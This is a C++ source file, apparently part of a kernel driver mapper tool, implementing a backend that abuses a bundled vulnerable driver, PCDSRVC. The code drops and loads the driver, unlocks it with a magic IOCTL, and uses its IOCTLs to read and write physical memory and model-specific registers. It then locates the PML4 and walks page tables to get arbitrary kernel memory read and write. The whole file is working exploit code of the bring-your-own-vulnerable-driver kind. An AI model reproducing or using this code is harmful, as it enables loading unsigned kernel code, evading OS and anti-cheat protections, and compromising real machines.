#include <kZeroMapper/kZeroMapperConfig.h>

#if defined(KZEROMAPPER_ENABLE_PCDSRVC)

#include "PCDSRVCBackend.h"
#include "../Common/VulnerableDriverLoader.h"
#include "pcdsrvc_sys.h"
#include "../DirectIO64/halamd64.h"
#include <algorithm>
#include <vector>

namespace
{
	constexpr DWORD PcdsrvcUnlockIoctl       = 0x222004;
	constexpr DWORD PcdsrvcV2pIoctl          = 0x222080;
	constexpr DWORD PcdsrvcReadPhysicalIoctl = 0x222084;
	constexpr DWORD PcdsrvcWritePhysicalIoctl = 0x222088;
	constexpr DWORD PcdsrvcReadMsrIoctl      = 0x222180;
	constexpr DWORD PcdsrvcWriteMsrIoctl     = 0x222184;

	constexpr uint32_t UnlockMagic = 0xA1B2C3D4;

	constexpr uint64_t PhysicalAddressMask       = 0x000ffffffffff000ull;
	constexpr uint64_t PhysicalAddressMask2MbPages = 0x000fffffffe00000ull;
	constexpr uint64_t VirtualAddressMask2MbPages   = 0x00000000001fffffull;
	constexpr uint64_t VirtualAddressMask4KbPages   = 0x0000000000000fffull;
	constexpr uint64_t EntryPageSizeBit          = 0x0000000000000080ull;
	constexpr uint64_t EntryPresentBit           = 0x0000000000000001ull;

	ULONG GetProcessorStartBlockCr3Offset( )
	{
		return FIELD_OFFSET( PROCESSOR_START_BLOCK, ProcessorState ) +
			FIELD_OFFSET( KSPECIAL_REGISTERS, Cr3 );
	}

	ULONG ScanLowStubForPml4( const uint8_t* data, ULONG size )
	{
		const auto cr3Offset = GetProcessorStartBlockCr3Offset( );

		for ( ULONG i = 0; i < size; i += 0x1000 )
		{
			__try
			{
				const auto ptr = r_cast<uintptr_t>( data + i );

				const auto jmp = r_cast<const FAR_JMP_16*>( ptr );

				if ( jmp->OpCode != 0xE9 )
					continue;

				const auto lmTarget = *r_cast<const uint64_t*>( ptr + FIELD_OFFSET( PROCESSOR_START_BLOCK, LmTarget ) );

				if ( ( lmTarget & 0xfffff80000000003ull ) != 0xfffff80000000000ull )
					continue;

				const auto cr3 = *r_cast<const uint64_t*>( ptr + cr3Offset );

				if ( cr3 == 0 || ( cr3 & 0xffffff0000000fffull ) != 0 )
					continue;

				return i;
			}
			__except ( EXCEPTION_EXECUTE_HANDLER )
			{
				continue;
			}
		}

		return 0xFFFFFFFF;
	}

	uint64_t ReadPml4FromLowStub( const uint8_t* data, ULONG offset )
	{
		const auto cr3Offset = GetProcessorStartBlockCr3Offset( );
		return *r_cast<const uint64_t*>( data + offset + cr3Offset );
	}
}

std::string PCDSRVCBackend::Name( ) const
{
	return pstra( "PCDSRVC" );
}

NTSTATUS PCDSRVCBackend::Load( )
{
	const auto status = KernelRwCallBackend::Load( );

	if ( status != STATUS_SUCCESS )
		return status;

	if ( !m_NtUserSetGestureConfigRef )
	{
		LOG_SEC( "[-] - [PCDSRVC] NtUserSetGestureConfig_ref not found" );
		return 0x9170;
	}

	return STATUS_SUCCESS;
}

NTSTATUS PCDSRVCBackend::LoadDevice( )
{
	auto image = Tools::DecodePEBuffer( pcdsrvc_sys, sizeof( pcdsrvc_sys ) );

	return DropLoadAndOpenMapperDriver( Name( ).c_str( ), pstrw( L"\\\\.\\PCDSRVC{3B54B31B-D06B6431-06020200}_0" ),
		image.data( ), image.size( ), &m_Device, 0x9190,
		pstra( "PCDSRVC{3B54B31B-D06B6431-06020200}_0" ) );
}

NTSTATUS PCDSRVCBackend::UnloadDevice( )
{
	CloseMapperDevice( &m_Device );
	return UnloadMapperDriver( pstra( "PCDSRVC{3B54B31B-D06B6431-06020200}_0" ) );
}

bool PCDSRVCBackend::UnlockDriver( )
{
	if ( m_Unlocked )
		return true;

	uint32_t magic = UnlockMagic;
	uint32_t response = 0;
	DWORD bytesReturned = 0;

	if ( !DeviceIoControl( m_Device, PcdsrvcUnlockIoctl, &magic, sizeof( magic ), &response, sizeof( response ), &bytesReturned, nullptr ) )
	{
		LOG_SEC( "[-] - [PCDSRVC] UnlockDriver failed gle=%lu", GetLastError( ) );
		return false;
	}

	m_Unlocked = true;
	LOG_SEC( "[+] - [PCDSRVC] Driver unlocked", 0 );
	return true;
}

bool PCDSRVCBackend::GetPhysicalAddress( uint64_t virtualAddress, uint64_t* physicalAddress )
{
	if ( !physicalAddress )
		return false;

	*physicalAddress = 0;

	uint64_t va = virtualAddress;
	uint64_t pa = 0;
	DWORD bytesReturned = 0;

	if ( !DeviceIoControl( m_Device, PcdsrvcV2pIoctl, &va, sizeof( va ), &pa, sizeof( pa ), &bytesReturned, nullptr ) )
	{
		LOG_SEC( "[-] - [PCDSRVC] GetPhysicalAddress IOCTL failed va=0x%llx gle=%lu", virtualAddress, GetLastError( ) );
		return false;
	}

	if ( !pa )
	{
		LOG_SEC( "[-] - [PCDSRVC] GetPhysicalAddress returned 0 va=0x%llx", virtualAddress );
		return false;
	}

	*physicalAddress = pa;
	return true;
}

bool PCDSRVCBackend::ReadPhysical( uint64_t physicalAddress, void* buffer, uint32_t length )
{
	if ( !buffer || !length )
		return false;

	PhysicalMemoryHeader header {};
	header.PhysicalAddress = physicalAddress;
	header.Length = length;
	header.AccessMode = 0;

	DWORD bytesReturned = 0;

	return DeviceIoControl( m_Device, PcdsrvcReadPhysicalIoctl, &header, sizeof( header ), buffer, length, &bytesReturned, nullptr ) != FALSE;
}

bool PCDSRVCBackend::WritePhysical( uint64_t physicalAddress, const void* buffer, uint32_t length )
{
	if ( !buffer || !length )
		return false;

	std::vector<uint8_t> request( sizeof( PhysicalMemoryHeader ) + length );

	auto header = r_cast<PhysicalMemoryHeader*>( request.data( ) );
	header->PhysicalAddress = physicalAddress;
	header->Length = length;
	header->AccessMode = 0;

	memcpy( request.data( ) + sizeof( PhysicalMemoryHeader ), buffer, length );

	DWORD bytesReturned = 0;

	return DeviceIoControl( m_Device, PcdsrvcWritePhysicalIoctl, request.data( ), s_cast<DWORD>( request.size( ) ), nullptr, 0, &bytesReturned, nullptr ) != FALSE;
}

bool PCDSRVCBackend::ReadMsr( uint32_t msrRegister, uint64_t* value )
{
	if ( !value )
		return false;

	MsrAccess access {};
	access.MsrRegister = msrRegister;
	access.Value = 0;

	DWORD bytesReturned = 0;

	if ( !DeviceIoControl( m_Device, PcdsrvcReadMsrIoctl, &access, sizeof( access ), &access, sizeof( access ), &bytesReturned, nullptr ) )
		return false;

	*value = access.Value;
	return true;
}

bool PCDSRVCBackend::WriteMsr( uint32_t msrRegister, uint64_t value )
{
	MsrAccess access {};
	access.MsrRegister = msrRegister;
	access.Value = value;

	DWORD bytesReturned = 0;

	return DeviceIoControl( m_Device, PcdsrvcWriteMsrIoctl, &access, sizeof( access ), &access, sizeof( access ), &bytesReturned, nullptr ) != FALSE;
}

bool PCDSRVCBackend::QueryPml4( uint64_t* value )
{
	if ( !value )
		return false;

	*value = 0;

	const ULONG mapSize = 0x100000;
	std::vector<uint8_t> lowMemory( mapSize );

	uint64_t offset = 0;
	while ( offset < mapSize )
	{
		ULONG chunk = s_cast<ULONG>( std::min<uint64_t>( 0x1000, mapSize - offset ) );

		if ( !ReadPhysical( offset, lowMemory.data( ) + offset, chunk ) )
		{
			LOG_SEC( "[-] - [PCDSRVC] QueryPml4 failed reading low stub offset=0x%llx", offset );
			return false;
		}

		offset += chunk;
	}

	const auto stubOffset = ScanLowStubForPml4( lowMemory.data( ), mapSize );

	if ( stubOffset != 0xFFFFFFFF )
	{
		*value = ReadPml4FromLowStub( lowMemory.data( ), stubOffset );
		LOG_SEC( "[*] - [PCDSRVC] QueryPml4 found pml4=0x%llx lowStubOffset=0x%X", *value, stubOffset );
		return true;
	}

	LOG_SEC( "[*] - [PCDSRVC] Low stub scan failed, trying PML4 brute-force scan", 0 );

	uint64_t gsBase = 0;
	if ( ReadMsr( 0xC0000101, &gsBase ) && gsBase )
		LOG_SEC( "[*] - [PCDSRVC] IA32_GS_BASE=0x%llx", gsBase );

	const uint64_t validationVa = m_Ntoskrnl ? m_Ntoskrnl : gsBase;
	if ( !validationVa )
	{
		LOG_SEC( "[-] - [PCDSRVC] No validation VA available (ntoskrnl=0 gsBase=0)", 0 );
		return false;
	}

	LOG_SEC( "[*] - [PCDSRVC] Validation VA=0x%llx", validationVa );

	constexpr ULONG pageSize = 0x1000;
	constexpr uint64_t maxScanPa = 0x80000000ull;
	constexpr uint64_t maxValidPa = 0x10000000000ull;
	std::vector<uint8_t> page( pageSize );

	ULONG candidateCount = 0;

	for ( uint64_t pa = 0; pa + pageSize <= maxScanPa; pa += pageSize )
	{
		if ( !ReadPhysical( pa, page.data( ), pageSize ) )
			continue;

		const auto entries = r_cast<const uint64_t*>( page.data( ) );

		ULONG presentCount = 0;
		for ( ULONG idx = 0; idx < pageSize / sizeof( uint64_t ); ++idx )
		{
			if ( entries[ idx ] & EntryPresentBit )
				++presentCount;
		}

		if ( presentCount < 8 )
			continue;

		++candidateCount;

		uint64_t testPa = 0;
		if ( !VirtualToPhysicalWithCr3( pa, validationVa, &testPa ) )
			continue;

		if ( testPa == 0 || testPa >= maxValidPa )
			continue;

		uint16_t mz = 0;
		if ( !ReadPhysical( testPa, &mz, sizeof( mz ) ) )
			continue;

		if ( mz != 0x5A4D )
			continue;

		*value = pa;
		LOG_SEC( "[*] - [PCDSRVC] QueryPml4 found pml4=0x%llx (present=%lu testPa=0x%llx candidates=%lu)",
			*value, presentCount, testPa, candidateCount );
		return true;
	}

	LOG_SEC( "[-] - [PCDSRVC] QueryPml4 failed to find PML4 (candidates=%lu)", candidateCount );
	return false;
}

bool PCDSRVCBackend::PageEntryToPhysicalAddress( uint64_t entry, uint64_t* physicalAddress )
{
	if ( entry & EntryPresentBit )
	{
		*physicalAddress = entry & PhysicalAddressMask;
		return true;
	}

	return false;
}

bool PCDSRVCBackend::VirtualToPhysicalWithCr3( uint64_t cr3, uint64_t virtualAddress, uint64_t* physicalAddress )
{
	if ( !physicalAddress )
		return false;

	*physicalAddress = 0;

	constexpr uint64_t PhysicalAddressMask1GbPages = 0x000fffffc0000000ull;
	constexpr uint64_t VirtualAddressMask1GbPages   = 0x000000003fffffffull;
	constexpr uint64_t Entry1GbPageSizeBit          = 0x0000000000000080ull;

	auto table = cr3 & PhysicalAddressMask;
	uint64_t entry = 0;

	for ( int r = 0; r < 4; r++ )
	{
		const auto shift = 39 - ( r * 9 );
		const auto selector = ( virtualAddress >> shift ) & 0x1ff;

		if ( !ReadPhysical( table + selector * sizeof( uint64_t ), &entry, sizeof( entry ) ) )
			return false;

		if ( !PageEntryToPhysicalAddress( entry, &table ) )
			return false;

		if ( r == 1 && ( entry & Entry1GbPageSizeBit ) )
		{
			table &= PhysicalAddressMask1GbPages;
			table += virtualAddress & VirtualAddressMask1GbPages;
			*physicalAddress = table;
			return true;
		}

		if ( r == 2 && ( entry & EntryPageSizeBit ) )
		{
			table &= PhysicalAddressMask2MbPages;
			table += virtualAddress & VirtualAddressMask2MbPages;
			*physicalAddress = table;
			return true;
		}
	}

	table += virtualAddress & VirtualAddressMask4KbPages;
	*physicalAddress = table;
	return true;
}

bool PCDSRVCBackend::VirtualToPhysicalByTableWalk( uint64_t virtualAddress, uint64_t* physicalAddress )
{
	if ( !physicalAddress )
		return false;

	uint64_t pml4 = 0;

	if ( !QueryPml4( &pml4 ) )
	{
		LOG_SEC( "[-] - [PCDSRVC] VirtualToPhysicalByTableWalk failed QueryPml4 va=0x%llx", virtualAddress );
		return false;
	}

	if ( !VirtualToPhysicalWithCr3( pml4, virtualAddress, physicalAddress ) )
	{
		LOG_SEC( "[-] - [PCDSRVC] VirtualToPhysicalByTableWalk failed va=0x%llx pml4=0x%llx", virtualAddress, pml4 );
		return false;
	}

	LOG_SEC( "[*] - [PCDSRVC] VirtualToPhysicalByTableWalk va=0x%llx pa=0x%llx pml4=0x%llx", virtualAddress, *physicalAddress, pml4 );
	return true;
}

bool PCDSRVCBackend::ReadWriteVirtual( uint64_t address, void* buffer, size_t size, bool write )
{
	if ( !UnlockDriver( ) )
		return false;

	auto bytes = r_cast<uint8_t*>( buffer );
	size_t offset = 0;

	while ( offset < size )
	{
		uint64_t physical = 0;
		const auto currentAddress = address + offset;
		const auto pageLeft = 0x1000 - ( currentAddress & 0xFFF );
		const auto chunk = s_cast<uint32_t>( std::min<size_t>( pageLeft, size - offset ) );

		if ( !GetPhysicalAddress( currentAddress, &physical ) )
		{
			LOG_SEC( "[*] - [PCDSRVC] IOCTL V2P failed, falling back to table walk va=0x%llx", currentAddress );

			if ( !VirtualToPhysicalByTableWalk( currentAddress, &physical ) )
				return false;
		}

		if ( write )
		{
			if ( !WritePhysical( physical, bytes + offset, chunk ) )
			{
				LOG_SEC( "[-] - [PCDSRVC] WritePhysical failed pa=0x%llx size=0x%X", physical, chunk );
				return false;
			}
		}
		else
		{
			if ( !ReadPhysical( physical, bytes + offset, chunk ) )
			{
				LOG_SEC( "[-] - [PCDSRVC] ReadPhysical failed pa=0x%llx size=0x%X", physical, chunk );
				return false;
			}
		}

		offset += chunk;
	}

	return true;
}

bool PCDSRVCBackend::ReadMemory( uint64_t address, void* buffer, size_t size )
{
	const auto result = ReadWriteVirtual( address, buffer, size, false );

	if ( !result )
		LOG_SEC( "[-] - [PCDSRVC] ReadMemory failed va=0x%llx size=0x%llx", address, size );

	return result;
}

bool PCDSRVCBackend::WriteMemory( uint64_t address, const void* buffer, size_t size )
{
	const auto result = ReadWriteVirtual( address, const_cast<void*>( buffer ), size, true );

	if ( !result )
		LOG_SEC( "[-] - [PCDSRVC] WriteMemory failed va=0x%llx size=0x%llx", address, size );

	return result;
}




#endif // KZEROMAPPER_ENABLE_PCDSRVC